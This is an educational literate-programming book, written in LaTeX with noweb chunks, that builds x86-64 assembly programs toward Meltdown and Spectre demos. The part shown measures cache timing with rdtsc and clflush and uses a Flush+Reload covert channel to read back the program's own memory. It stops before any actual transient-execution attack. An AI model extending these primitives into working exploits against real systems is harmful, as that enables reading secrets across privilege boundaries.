\documentclass[paper=a4]{scrbook}

\usepackage{fancyvrb}
\usepackage{noweb}
\usepackage{xcolor}
\usepackage[breaklinks]{hyperref}
\usepackage[acronym,toc,numberedsection=autolabel,nopostdot]{glossaries}

\renewcommand{\rm}[0]{\normalfont \rmfamily}
\renewcommand{\tt}[0]{\normalfont \ttfamily}
\renewcommand{\it}[0]{\normalfont \itshape}

\renewcommand{\autodot}{}

% Code to get fewer pages by letting the code chunks to break at page limits
\def\nwendcode{\endtrivlist \endgroup}
\let\nwdocspar=\par

\hypersetup{
    colorlinks=true,
    linkcolor=[rgb]{0,0,.4},
    urlcolor=[rgb]{.3,0,.4},
    linktoc=all,
    pdftitle={Meltdown and Spectre Samples},
}

\setkomafont{labelinglabel}{\ttfamily}

\newglossary*{ins}{x86-Instructions}

\makeglossaries

\setacronymstyle{long-short}

\newacronym{rng}{RNG}{random number generator}

\newacronym{ascii}{ASCII}{American Standard Code for Information Interchange}

\glsunset{ascii}

\newacronym{lf}{LF}{line feed}

\newglossaryentry{x86}{
    name=x86,
    description={x86 denotes a microprocessor architecture based on the 8086/8088}
}

\newglossaryentry{rdtsc}{
    type=ins,
    name=\ttfamily{rdtsc},
    description={Read Time Stamp Counter, introduced with Intel\textsuperscript{\textregistered}
        Pentium\textsuperscript{\textregistered}}
}

\newglossaryentry{lfence}{
    type=ins,
    name=\ttfamily{lfence},
    description={Load Fence, introduced with Intel\textsuperscript{\textregistered}
        Pentium\textsuperscript{\textregistered}~4}
}

\newglossaryentry{clflush}{
    type=ins,
    name=\ttfamily{clflush},
    description={Flush Cache Line, introduced with Intel\textsuperscript{\textregistered}
        Pentium\textsuperscript{\textregistered}~4}
}

\newtheorem{definition}{Definition}

\begin{document}
@

\author{U. Plonus \\ \href{mailto:u.plonus@gmail.com}{u.plonus@gmail.com}}
\title{Meltdown and Spectre Samples}
\subtitle{Written in Assembly}
\maketitle

\begin{Verbatim}[fontsize=\small]
    Copyright (C) 2018 U. Plonus.
    Permission is granted to copy, distribute and/or modify this document
    under the terms of the GNU Free Documentation License, Version 1.3
    or any later version published by the Free Software Foundation;
    with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts.
    A copy of the license is included in the section entitled "GNU
    Free Documentation License".
\end{Verbatim}

\tableofcontents

\chapter{Introduction}

\section{Overview}

TBD

\section{Conventions}

\subsection{Introduction}

In this section we define some convention that are specific for this document.

\subsection{Data Sections}

The data is divided into three parts: read-only data, initialized data and uninitialized data. Code chunks with this
type of data will all have defined sufficies.

\begin{definition}
Read-only data is data that is not modified during program execution. The suffix for read-only data is \textbf{-rodata}.
\end{definition}

\begin{definition}
Initialized data is data that is changeable during program execution. The data is already initialized with data when the
program starts. The suffix for initialized data is \textbf{-idata}.
\end{definition}

\begin{definition}
Uninitialized data is data that is changeable during program execution. The data is not initialized. The suffix for
uninitialized data is \textbf{-udata}.
\end{definition}

\section{Nasm}

TBD

<<preamble>>=
bits 64

<<license>>

     global         _start
     pagesize       equ 4096
@ %def pagesize _start

\chapter{Cache Access Timing}

\section{Introduction}

TBD

\section{Detect Cache Access Time}

\subsection{High Resolution Timer}

First we need a high resolution timer to determine the cache access time. For this we use the time stamp counter. The
time stamp counter is monotonically incrementing. When reading the time stamp counter (with \gls{rdtsc}) the result is
delivered back in the registers \verb|EDX| and \verb|EAX| forming a 64bit value. The time stamp counter is not an
absolute value but a relative value, meaning that you cannot (easily) calculate from the time stamp counter to some time
units (e.g. ns). But this is no problem as we only want to measure relative times.

To retrieve a 64bit value for the time we shift the value in \verb|EDX| 32 bits to the left and add the value of
\verb|EAX| to this.

<<tsc-64bit>>=
     rdtsc
     shl       RDX,32
     add       RAX,RDX
@

\subsection{Cache Access Time Routine}

Next we need a routine that calculates the cache access time for us.

First we have to ensure in this routine that the speculative execution of the processor does not interfere with our time
measurement. For this we use the instruction \gls{lfence} which ensures that all previous reads are done before
executing the next instructions.

Next we access a memory location with the address \verb|RDI| by loading this into \verb|RCX| and measure the time before
and after the access.

The command \gls{lfence} before reading the time stamp counter is needed because we have to ensure that all reads before
the time measurements are done.

At last we calculate the relative time needed to access the memory location. In theory we should see a difference
whether the memory location is accessed before or not.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the memory which is loaded either from the cache or from memory
\end{labeling}

\paragraph{Return}
\begin{labeling}{[XXX-XXX]}
\item [RAX] the relative time of the cache access
\end{labeling}

<<calculate-cache-access-time>>=
_calccachetime:
     lfence
<<tsc-64bit>>
     mov       R8,RAX
     mov       RCX,[RDI]
     lfence
<<tsc-64bit>>
     sub       RAX,R8
     ret
@ %def _calccachetime

\section{Measure Cache Access Time}
\label{sec:Measure Cache Access Time}

\subsection{Setup}

To measure the cache timing we create a standalone program that shows us the time for a cached and for an uncached
memory access.

First we need some area in memory with data which we can later read from. This data area goes into the area \verb|.bss|
which contains uninitialized data. We align the data at a page boundary and reserve one pages for our data.

<<data-udata>>=
     alignb         pagesize
     data:          resb pagesize
@ %def data

From time to time we need a small scratch area so we define an area with 32~bytes.

<<scratch-udata>>=
     scratch:       resb 32
@ %def scratch

The program begins with the label \verb|_start|.

<<cachetiming-program>>=
_start:
@

Now we start with initialising the [[data]] area with some random data. For this we load \verb|RDI| with the address of
the [[data]] area.

\nextchunklabel{init-random-data-1}
<<init-random-data>>=
     mov       RDI,data
@

Next we load the number of bytes to fill into \verb|RSI|. For this we load the [[pagesize]] into \verb|RSI|.

\nextchunklabel{init-random-data-2}
<<init-random-data>>=
     mov       RSI,pagesize
@

At last we load \verb|EDX| with some random seed. For this we use \gls{rdtsc} and only use the lower 32~bit of the
value.

\nextchunklabel{init-random-data-3}
<<init-random-data>>=
     rdtsc
     mov       EDX,EAX
@

Now we call [[_xorshift]] to fill the [[data]] area.

\nextchunklabel{init-random-data-4}
<<init-random-data>>=
     call      _xorshift
@

Now we add this [[data]] initialization to our program.

<<cachetiming-program>>=
<<init-random-data>>
@

\subsection{Measure Time}

Now that we have setup our [[data]] area we can now cache data from the first page by loading it into a register which
also loads this into the cache.

For this we load \verb|RDI| with the address of the [[data]] area.

<<cachetiming-program>>=
     mov       RDI,data
@

Before we load the data into a register now we will clear the cache lines with the given address. For this we use the
instruction \gls{clflush}. After flushing the cache line we ensure (with \gls{lfence}) that all reads from memory are
finished before we load the data into a register again (and filling the cache).

<<cachetiming-program>>=
     clflush   [RDI]
     lfence
     mov       RCX,[RDI]
@

Now we can determine the time that is needed to load this data once again. We do not need to load \verb|RDI| again
because it has not changed.

<<cachetiming-program>>=
     call      _calccachetime
@

Now we have the relative cache access time in register \verb|RAX|. We store this value to the stack and print out an
explaining text.

For this we define the text to print.

<<cachetiming-rodata>>=
<<common-rodata>>
     scached:       db "Cached Access Time: ",0x00
@ %def scached

Additionally we define some helper data, in this case \gls{lf}.

<<common-rodata>>=
     slf:           db 0x0a
@ %def slf

Now we can store \verb|RAX| and print the text.

<<cachetiming-program>>=
     push      RAX
     mov       RDI,scached
     call      _print
@

We now restore the value and print the measured time to \verb|stdout|.

<<cachetiming-program>>=
     pop       RDI
     mov       RSI,scratch
     call      _printdu64bit
@

At last we append a \gls{lf} to the output.

<<cachetiming-program>>=
     mov       RSI,slf
     mov       RDI,1
     call      _nprint
@

Now we do the same with an uncached value. The difference is that we do not load the value before.

<<cachetiming-program>>=
     mov       RDI,data
     clflush   [RDI]
     lfence
     call      _calccachetime
@

Now we have the time of the uncached data access in \verb|RAX| and can print it out with some explaining text.

<<cachetiming-rodata>>=
     suncached:     db "Uncached Access Time: ",0x00
@ %def suncached

<<cachetiming-program>>=
     push      RAX
     mov       RDI,suncached
     call      _print
     pop       RDI
     mov       RSI,scratch
     call      _printdu64bit
     mov       RSI,slf
     mov       RDI,1
     call      _nprint
@

At last we exit the program.

<<cachetiming-program>>=
<<exitProgram>>
@

Now we can put everything together and have our \verb|cachetiming| program that we can now execute.

<<cachetiming.asm>>=
<<preamble>>

section .rodata
<<cachetiming-rodata>>

section .bss
<<data-udata>>
<<scratch-udata>>

section .text
<<cachetiming-program>>

<<calculate-cache-access-time>>

<<xorshift-prng>>

<<utilities>>
@

The program source is placed in \verb|asm/|. With \verb|make| in the folder we can create an executable which is moved
to \verb|bin/|. There we can execute this program.

\begin{verbatim}
$ bin/cachetiming
Cached Access Time: 72
Uncached Access Time: 372
$ 
\end{verbatim}

\section{Read Byte via Cache Access Time}

\subsection{Introduction}

We have seen that we can determine if the content of a memory address is in the cache or not (see
\ref{sec:Measure Cache Access Time} \nameref{sec:Measure Cache Access Time}).

So next we try to read a single byte from the memory by only detecting the cache access time.

\subsection{Clear Cache for Measurement}

Before we can determine the cache access times we need to clear the cache. We define a subroutine for this.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the probe memory
\item [RSI] the step size in the probe memory
\end{labeling}

<<clearcache>>=
_clearcache:
     mov       RCX,256
     cld
.nextflush:
     clflush   [RDI]
     add       RDI,RSI
     loop      .nextflush
     lfence
     ret
@ %def _clearcache

Now we add this to our program.

<<cachereadbyte-program>>=
     mov       RDI,probe
     mov       RSI,pagesize
     call      _clearcache
@

\subsection{Indexed Array Access}

To read the value of a byte via the cache we use the byte to index into a probe array and then determine the cache
access times of this probe array.

For this we will first create a [[probe]] array.

<<probe-udata>>=
     alignb         pagesize
     probe          times 256 resb pagesize
@ %def probe

Next we will fill this [[probe]] array with some random data (similar to the chunks for [[data]]
\subpageref{init-random-data-1}, \subpageref{init-random-data-2}, \subpageref{init-random-data-3} and
\subpageref{init-random-data-4}).

<<init-random-probe>>=
     mov       RDI,probe
     mov       RSI,pagesize
     shl       RSI,8
     rdtsc
     mov       EDX,EAX
     call      _xorshift
@

Now we add the initialization of the [[data]] and [[probe]] area to the program.

<<cachereadbyte-program>>=
_start:
<<init-random-data>>
<<init-random-probe>>
@

Now we can read a byte from [[data]] into \verb|AL|.

<<cachereadbyte-program>>=
     mov       RDI,data
     xor       RAX,RAX
     mov       AL,[RDI]
@

We use the value in RAX to access the probe array.

<<cachereadbyte-program>>=
     mov       RDX,pagesize
     mul       RDX
     mov       RSI,probe
     mov       AL,[RSI+RAX]
@

Now we read the datum back via the cache access times. For this we create subroutines.

\subsection{Read a Byte from the Cache}

First we create a subroutine to read the cache access timings for the probe area.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the probe memory
\item [RSI] the step size in the probe memory
\item [RDX] an area to keep the detected cache access times (256~*~8~bytes)
\end{labeling}

<<readcachetiming>>=
_readcachetiming:
<<enterstackframe>>
@ %def _readcachetiming

Now we create space on the stack to keep the variables. Next we save the parameters to the stack space created.

<<readcachetiming>>=
     sub       RSP,32
     mov       [RBP-8],RDI
     mov       [RBP-16],RSI
     mov       [RBP-24],RDX
@

Now we can start detecting the cache access times.

<<readcachetiming>>=
     mov       RCX,256
.nextcacheread:
     mov       [RBP-32],RCX
     call      _calccachetime
     mov       RDX,[RBP-24]
     mov       [RDX],RAX
     add       RDX,8
     mov       [RBP-24],RDX
     mov       RDI,[RBP-8]
     add       RDI,[RBP-16]
     mov       [RBP-8],RDI
     mov       RCX,[RBP-32]
     loop      .nextcacheread
@

At the end we clean up the stack again and return to the caller.

<<readcachetiming>>=
<<leavestackframe>>
     ret
@

After we determined all cache access times we can now find the lowest access time and with this the possible byte. We
return two results from this subroutine, in \verb|AL| the byte with the lowest cache access time and in \verb|AH| the
count of the lowest cache access time. Only if \verb|AH| is 1 then the value in \verb|AL| is valid.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the area with the detected cache access times (256~*~8~bytes)
\end{labeling}

\paragraph{Return}
\begin{labeling}{[XXX-XXX]}
\item [AL] the read byte (in \verb|AL|) with the lowest cache access time
\item [AH] the number of bytes read with the lowest cache access time
\end{labeling}

\nextchunklabel{analyzecachemintiming}
<<analyzecachemintiming>>=
_analyzecachetiming:
     push      RDI
     mov       R8,0xffffffffffffffff
     xor       R9,R9
     xor       RCX,RCX
     mov       RSI,RDI
.nexttry:
     lodsq
     cmp       RAX,R8
     ja        .nohit
     mov       R8,RAX
     mov       R9,RCX
.nohit:
     inc       RCX
     cmp       RCX,256
     jb        .nexttry
     xor       RCX,RCX
     pop       RSI
.nextcount:
     lodsq
     cmp       RAX,R8
     ja        .nomin
     inc       R10
.nomin:
     inc       RCX
     cmp       RCX,256
     jb        .nextcount
     mov       RAX,R10
     shl       RAX,8
     mov       AL,R9b
     ret
@

\subsection{The Whole Program to Read a Byte from Cache}

Before we can start using our new subroutine [[_readcachetiming]] we need to define a data area for the cache access
times.

<<timings-udata>>=
     timings        resq 256
@

Now we have all subroutines together we now can start implementing the main program and output the byte read.

<<cachereadbyte-program>>=
     mov       RDI,probe
     mov       RSI,pagesize
     mov       RDX,timings
     call      _readcachetiming
     mov       RDI,timings
     call      _analyzecachetiming
@

Now we define a string to output for the read byte and the expected byte.

<<cachereadbyte-rodata>>=
     sreadbyte:     db "Byte read via cache access:     ",0x00
     ssountbyte:    db "Count of bytes with min timing: ",0x00
     sexpectedbyte: db "Expected byte from data:        ",0x00
@

We save the value from \verb|RAX| (only \verb|AL| is interesting to us) to the stack and print out the text.

<<cachereadbyte-program>>=
     push      RAX
     mov       RDI,sreadbyte
     call      _print
@

Now we print the read byte and end the line with a \gls{lf}.

<<cachereadbyte-program>>=
     pop       RDI
     push      RDI
     and       RDI,0xff
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
@

Next we print (for information) the number of bytes read with the minimum cache access timing.

<<cachereadbyte-program>>=
     mov       RDI,ssountbyte
     call      _print
     pop       RDI
     shr       RDI,8
     and       RDI,0xff
     mov       RSI,scratch
     call      _printdu64bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
@

Now we read the byte from the original data array and print this also.

<<cachereadbyte-program>>=
     mov       RDI,sexpectedbyte
     call      _print
     mov       RSI,data
     xor       RAX,RAX
     mov       AL,[RSI]
     mov       RDI,RAX
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
@

At last we exit the program.

<<cachereadbyte-program>>=
<<exitProgram>>
@

Now we put all together to get the program \verb|cachereadbyte| that we can execute.

<<cachereadbyte.asm>>=
<<preamble>>

section .rodata
<<common-rodata>>
<<cachereadbyte-rodata>>

section .bss
<<data-udata>>
<<probe-udata>>
<<scratch-udata>>
<<timings-udata>>

section .text
<<cachereadbyte-program>>

<<clearcache>>

<<calculate-cache-access-time>>

<<readcachetiming>>

<<analyzecachemintiming>>

<<xorshift-prng>>

<<utilities>>
@

\subsection{Improve Cache Access Time Analysis}

As we can see -- when running the program \verb|cachereadbyte| -- the result is not always as clear as it could be.
Simply getting the lowest cache access time seems not to be enough.

Sample outputs of the program are

\begin{verbatim}
$ bin/cachereadbyte
Byte read via cache access:     2b
Count of bytes with min timing: 1
Expected byte from data:        2b
$ bin/cachereadbyte
Byte read via cache access:     ff
Count of bytes with min timing: 11
Expected byte from data:        b3
$ bin/cachereadbyte
Byte read via cache access:     2f
Count of bytes with min timing: 1
Expected byte from data:        87
$ 
\end{verbatim}

So we have to improve our cache time detection routine. We will change the implementation of the chunk
\subpageref{analyzecachemintiming} to define a thrshold that is a little bit above the min access time and run the
cache detection routine multiple times if no clear result is returned.

First start with the subrotuine to analyze the cache access timing. We define a threshold 25~\% above the minimum cache
access time.

First we search for the minimum cache access time.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the area with the detected cache access times (256~*~8~bytes)
\end{labeling}

\paragraph{Return}
\begin{labeling}{[XXX-XXX]}
\item [AL] the first byte (in \verb|AL|) with a cache access time below the threshold
\item [AH] the number of bytes read with a cache access time below the threshold
\end{labeling}

<<analyzecachesimpthrestiming>>=
_analyzecachetiming:
     push      RDI
     mov       R8,0xffffffffffffffff
     xor       RCX,RCX
     mov       RSI,RDI
.nextmin:
     lodsq
     cmp       RAX,R8
     ja        .nonewmin
     mov       R8,RAX
.nonewmin:
     inc       RCX
     cmp       RCX,256
     jb        .nextmin
@

Now we have the minimum cache access time in R8. Next we will add $\frac{1}{4}$ to this to have our threshold.

<<analyzecachesimpthrestiming>>=
     mov       RAX,R8
     shr       RAX,4
     add       R8,RAX
@

Now we scan the cache access times a second time and take all values below the threshold into account.

<<analyzecachesimpthrestiming>>=
     pop       RSI
     xor       RCX,RCX
     xor       R9,R9
.nextbyte:
     lodsq
     cmp       RAX,R8
     ja        .nonewbyte
     inc       R9
     mov       R10,RCX
.nonewbyte:
     inc       RCX
     cmp       RCX,256
     jb        .nextbyte
     mov       RAX,R9
     shl       RAX,8
     mov       AL,R10b
     ret
@

Now we put all together to get the program \verb|cachereadbyte2| that we can execute.

<<cachereadbyte2.asm>>=
<<preamble>>

section .rodata
<<common-rodata>>
<<cachereadbyte-rodata>>

section .bss
<<data-udata>>
<<probe-udata>>
<<scratch-udata>>
<<timings-udata>>

section .text
<<cachereadbyte-program>>

<<clearcache>>

<<calculate-cache-access-time>>

<<readcachetiming>>

<<analyzecachesimpthrestiming>>

<<xorshift-prng>>

<<utilities>>
@

Now when we only find a single hit then the possibility that the byte from the cache timing is the original byte is much
higher.

Next we will create a program that tries to read the value from the cache until we have a single result.

First we initialize our data and probe areas.

<<cachereadbyte3-program>>=
_start:
<<init-random-data>>
<<init-random-probe>>
@

Next we create a subroutine that clears the cache and reads in a byte via the probe array.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the byte to read
\item [RSI] the address of the probe memory
\item [RDX] the step size in the probe memory
\end{labeling}

<<readbyte2cache>>=
_readbyte2cache:
     push      RDI
     push      RSI
     push      RDX
     mov       RDI,RSI
     mov       RSI,RDX
     call      _clearcache
@ %def _readbyte2cache

Next we can add the read of the byte and caching the data from the probe array.

<<readbyte2cache>>=
     pop       RDX
     pop       RSI
     pop       RDI
     xor       RAX,RAX
     mov       AL,[RDI]
     mul       RDX
     mov       AL,[RSI+RAX]
     ret
@

Now we add the call to this subroutine to our program and determine the byte by analyzing the cache access times.

<<cachereadbyte3-program>>=
.startreadcache:
     mov       RDI,data
     mov       RSI,probe
     mov       RDX,pagesize
     call      _readbyte2cache
     mov       RDI,probe
     mov       RSI,pagesize
     mov       RDX,timings
     call      _readcachetiming
     mov       RDI,timings
     call      _analyzecachetiming
@

Now we check if the read byte was a single byte, else we will do this again.

<<cachereadbyte3-program>>=
     cmp       AH,1
     ja        .startreadcache
@

Now we print out our result.

<<cachereadbyte3-program>>=
     push      RAX
     mov       RDI,sreadbyte
     call      _print
     pop       RDI
     and       RDI,0xff
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
     mov       RDI,sexpectedbyte
     call      _print
     mov       RSI,data
     xor       RAX,RAX
     mov       AL,[RSI]
     mov       RDI,RAX
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
<<exitProgram>>
@

<<cachereadbyte3.asm>>=
<<preamble>>

section .rodata
<<common-rodata>>
<<cachereadbyte-rodata>>

section .bss
<<data-udata>>
<<probe-udata>>
<<scratch-udata>>
<<timings-udata>>

section .text
<<cachereadbyte3-program>>

<<readbyte2cache>>

<<clearcache>>

<<calculate-cache-access-time>>

<<readcachetiming>>

<<analyzecachesimpthrestiming>>

<<xorshift-prng>>

<<utilities>>
@

Even if this program is not perfect because it is not reliable all the time it is reliable enough to demonstrate the
next steps.

\section{Read Array via Cache Access Time}

\subsection{Introduction}

Now we have read a byte via the cache access times. Now it is time to read a complete memory area.

\subsection{Setup}

For this we use the [[data]] defined before and read in the complete area. For this we need additionally a memory area
that holds the read data.

<<readback-udata>>=
     alignb         pagesize
     readbackdata   resb pagesize
@ %def readbackdata

First we initialize the [[data]] and [[probe]] areas in our program with some random data.

<<cacheread-program>>=
_start:
<<init-random-data>>
<<init-random-probe>>
@

Next we will define a subroutine that reads the [[data]] area and writes the results of the cache read into
[[readbackdata]].

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the data memory
\item [RSI] the size of the data memory
\item [RDX] the address of the probe memory
\item [RCX] the step size in the probe memory (the probe area needs to be at least 256~*~RCX~bytes in size)
\item [R8] the address of the readback area (must be at least the same size as the data area)
\item [R9] the address of the the area to keep the timing data (at least 256~*~8~bytes)
\end{labeling}

<<readarea>>=
_readarea:
@ %def _readarea

Now we create some place on the stack and store the parameters on it. We reserve an extra place at \verb|[RBP-56]| for a
counter into the data memory.

<<readarea>>=
<<enterstackframe>>
     sub       RSP,56
     mov       [RBP-8],RDI
     mov       [RBP-16],RSI
     mov       [RBP-24],RDX
     mov       [RBP-32],RCX
     mov       [RBP-40],R8
     mov       [RBP-48],R9
     xor       RAX,RAX
     mov       [RBP-56],RAX
@

First we have to clear the cache before we can measure any cache access times.

<<readarea>>=
.startread:
     mov       RDI,[RBP-24]
     mov       RSI,[RBP-32]
     call      _clearcache
@

Now we can load the byte from the memory and cache the according value from the [[probe]] memory.

<<readarea>>=
     mov       RSI,[RBP-8]
     add       RSI,[RBP-56]
     xor       RAX,RAX
     mov       AL,[RSI]
     mov       RDX,[RBP-32]
     mul       RDX
     mov       RSI,[RBP-24]
     mov       AL,[RSI+RAX]
@

Now that we have filled our cache we can determine the cache access times.

<<readarea>>=
     mov       RDI,[RBP-24]
     mov       RSI,[RBP-32]
     mov       RDX,[RBP-48]
     call      _readcachetiming
@

Now we can analyze the cache access times.

<<readarea>>=
     mov       RDI,[RBP-48]
     call      _analyzecachetiming
@

If we have more than 1 hit then we retry the reading of the byte.

<<readarea>>=
     cmp       AH,1
     ja        .startread
@

Now that we found a byte we store it in the resulting memory area.

<<readarea>>=
     mov       RDI,[RBP-40]
     mov       RCX,[RBP-56]
     add       RDI,RCX
     mov       [RDI],AL
     inc       RCX
     mov       [RBP-56],RCX
     cmp       RCX,[RBP-16]
     jb        .startread
@

Now we clean up the stack frame and return to the caller.

<<readarea>>=
<<leavestackframe>>
     ret
@

Now we can add this to our program and read the area.

<<cacheread-program>>=
     mov       RDI,data
     mov       RSI,pagesize
     mov       RDX,probe
     mov       RCX,pagesize
     mov       R8,readbackdata
     mov       R9,timings
     call      _readarea
@

Now we want to display the results. This means we need a routine that displays the original [[data]] and the
[[readbackdata]] side by side. Additionally we want to highlight the value from the [[readbackdata]] if it differs from
the original data.

So start with defining some highlighting and some usefull helper strings.

<<cacheread-rodata>>=
     sbgred:        db 0x1b,"[1;41m",0x00
     sresetstyle:   db 0x1b,"[0m",0x00
     sseparator:    db "- ",0x00
     sblank:        db " "
     semptybyte:    db "   ",0x00
@ %def sbgred sresetstyle sseparator sblank semptybyte

Next we define a subroutine which prints out up to 16~bytes each side by side on the screen. If two bytes in the
arrays are different then the value at the right side (from the second array) will be printed with red background. The
routine should also return the number of values that are different in both areas.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the first array
\item [RSI] the address of the second array
\item [RDX] number of bytes to print (up to 16). If the value is above 16 then only 16 values are printed
\end{labeling}

\paragraph{Return}
\begin{labeling}{[XXX-XXX]}
\item [RAX] number of bytes that differ between both memory areas
\end{labeling}

<<print-comparision16>>=
_printcompare16:
@ %def _printcompare16

At the start of the subroutine we prepare a stack frame for further operations as we will need to save and restore the
registers \verb|RDI|, \verb|RSI|, \verb|RDX| and \verb|RCX| multiple times. Additionally we store \verb|R12| and
\verb|R13| to the stack to use this registers as scratch registers.

<<print-comparision16>>=
<<enterstackframe>>
     sub       RSP,32
     mov       [RBP-8],RDI
     mov       [RBP-16],RSI
     cmp       RDX,0x10
     jb        .valueok
     mov       RDX,0x10
.valueok:
     mov       [RBP-24],RDX
     push      R12
     push      R13
     xor       R13,R13
@

Next we can start and handle the "left" side of the output. We output up to 16~bytes and then continue at
\verb|.leftbytesdone| (\subpageref{print-comparision16-1}).

<<print-comparision16>>=
     xor       RCX,RCX
.nextbyteleft:
     cmp       RCX,RDX
     mov       [RBP-32],RCX
     jae       .leftbytesdone
     mov       AL,[RDI+RCX]
     xor       AH,AH
     mov       DI,AX
     mov       RSI,scratch
     call      _printh8bit
     mov       RDI,1
     mov       RSI,sblank
     call      _nprint
     mov       RDI,[RBP-8]
     mov       RDX,[RBP-24]
     mov       RCX,[RBP-32]
     inc       RCX
     jmp       .nextbyteleft
.leftbytesdone:
@

Now we fill up the space so that the space of 16~bytes is occupied.

\nextchunklabel{print-comparision16-1}
<<print-comparision16>>=
.leftemptybyte:
     cmp       RCX,0x10
     jae       .leftdone
     mov       RDI,semptybyte
     call      _print
     inc       RCX
     jmp       .leftemptybyte
.leftdone:
@

Next we print out the separator between the two compare block.

<<print-comparision16>>=
     mov       RDI,sseparator
     call      _print
@

To print the second half (for comparision) we restore the values of the parameters first.

<<print-comparision16>>=
     mov       RDI,[RBP-8]
     mov       RSI,[RBP-16]
     mov       RDX,[RBP-24]
@

Now we compare each byte with the original value first and then print it out. If the value differs from the original
value we additionally mark the byte.

<<print-comparision16>>=
     xor       RCX,RCX
.nextbyteright:
     mov       [RBP-32],RCX
     cmp       RCX,RDX
     jae       .rightbytesdone
     mov       AL,[RSI+RCX]
     mov       AH,[RDI+RCX]
     mov       R12W,AX
     cmp       AH,AL
     je        .printplain
     inc       R13
     mov       RDI,sbgred
     call      _print
.printplain:
     xor       RDI,RDI
     mov       AX,R12W
     xor       AH,AH
     mov       DI,AX
     mov       RSI,scratch
     call      _printh8bit
     mov       AX,R12W
     cmp       AH,AL
     je        .printdone
     mov       RDI,sresetstyle
     call      _print
.printdone:
     mov       RDI,1
     mov       RSI,sblank
     call      _nprint
     mov       RDI,[RBP-8]
     mov       RSI,[RBP-16]
     mov       RDX,[RBP-24]
     mov       RCX,[RBP-32]
     inc       RCX
     jmp       .nextbyteright
.rightbytesdone:
@

Now we fill up the place up to 16 bytes on the right side.

<<print-comparision16>>=
.rightemptybyte:
     cmp       RCX,0x10
     jae       .rightdone
     inc       RCX
     jmp       .rightemptybyte
.rightdone:
     mov       RDI,sresetstyle
     call      _print
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
     mov       RAX,R13
     pop       R13
     pop       R12
<<leavestackframe>>
     ret
@

Now that we can print 16~bytes in a line we simply divide the requested number of bytes into 16~bytes chunks and output
them.

First we set up the stack frame and save \verb|R12| to the stack to use it as scratch register.

\paragraph{Parameters}
\begin{labeling}{[XXX-XXX]}
\item [RDI] the address of the first array
\item [RSI] the address of the second array
\item [RDX] number of bytes to print
\end{labeling}

\paragraph{Return}
\begin{labeling}{[XXX-XXX]}
\item [RAX] number of bytes that differ between both memory areas
\end{labeling}

<<print-comparision>>=
_printcompare:
<<enterstackframe>>
     sub       RSP,40
     mov       [RBP-8],RDI
     mov       [RBP-16],RSI
     mov       [RBP-24],RDX
     push      R12
     xor       R12,R12
@ %def _printcompare

So first we calculate how many 16~bytes chunks there are. For each chunk with 16~bytes we will print out a line.

<<print-comparision>>=
     shr       RDX,4
     mov       [RBP-32],RDX
     xor       RCX,RCX
.nextline:
     mov       [RBP-40],RCX
     cmp       RCX,[RBP-32]
     jae       .linesdone
     mov       RAX,RCX
     shl       RAX,4
     mov       RDI,[RBP-8]
     add       RDI,RAX
     mov       RSI,[RBP-16]
     add       RSI,RAX
     mov       RDX,0x10
     call      _printcompare16
     add       R12,RAX
     mov       RCX,[RBP-40]
     inc       RCX
     jmp       .nextline
.linesdone:
@

<<print-comparision>>=
     mov       RAX,R12
     pop       R12
<<leavestackframe>>
     ret
@

Now we can print the complete memory compare.

<<cacheread-program>>=
     mov       RDI,data
     mov       RSI,readbackdata
     mov       RDX,pagesize
     call      _printcompare
@

Now we will print some statistics and then leave the program.

<<cacheread-rodata>>=
     sstatistics:   db "Failed read relation: ",0x00
     sper:          db "/"
@ %def sstatistics sper

<<cacheread-program>>=
     push      RAX
     mov       RDI,sstatistics
     call      _print
     pop       RDI
     mov       RSI,scratch
     call      _printdu64bit
     mov       RDI,1
     mov       RSI,sper
     call      _nprint
     mov       RDI,pagesize
     mov       RSI,scratch
     call      _printdu64bit
     mov       RDI,1
     mov       RSI,slf
     call      _nprint
<<exitProgram>>
@

Now we can put all together and create the program \verb|cacheread.asm|.

<<cacheread.asm>>=
<<preamble>>

section .rodata
<<common-rodata>>
<<cacheread-rodata>>

section .bss
<<data-udata>>
<<probe-udata>>
<<readback-udata>>
<<timings-udata>>
<<scratch-udata>>

section .text
<<cacheread-program>>

<<clearcache>>

<<calculate-cache-access-time>>

<<readcachetiming>>

<<analyzecachemintiming>>

<<readarea>>

<<print-comparision>>

<<print-comparision16>>

<<xorshift-prng>>

<<utilities>>
@

Now we have created a program that reads a complete memory area via the covert channel. When executing the pogram an
output like the following should occur. In the example additionally \verb|time| is used to get some timing in the end.
We have approx. 13~\% errors while read (in the example), which we will accept at this point. This rate also differs
depending on the processor and the load of the computer.

\begin{verbatim}
$ time bin/cacheread
eb 72 06 b6 06 f6 3e 73 d9 7f 32 12 9d 56 e7 e4 - 51 72 06 b6 06 f1 3e e1 d9 e1 32 12 9d 56 fd ea 
67 c1 aa c8 a4 4d 4b 80 3b 92 08 d6 9c 93 bd 4d - 67 c1 aa c8 a4 4d 4b 80 3b 92 08 d6 9c 93 61 4d 
1b e3 03 06 4b 7b 77 36 44 8f d0 fa d8 21 37 8c - 1b e8 03 06 4b 7b 77 36 44 ea d0 e1 d8 21 37 20 
1e ae 8e 69 38 37 eb 35 7e c9 8f 32 6e f9 ad bf - 1e ae 8e 69 38 37 e1 35 7e c9 d3 32 6e 9e ad 55 
ee 1c 87 10 03 09 4e 90 34 77 a6 7c 94 6c 55 fa - e1 1c 87 10 03 09 4e 90 34 77 a6 7c 94 6c 55 e9 
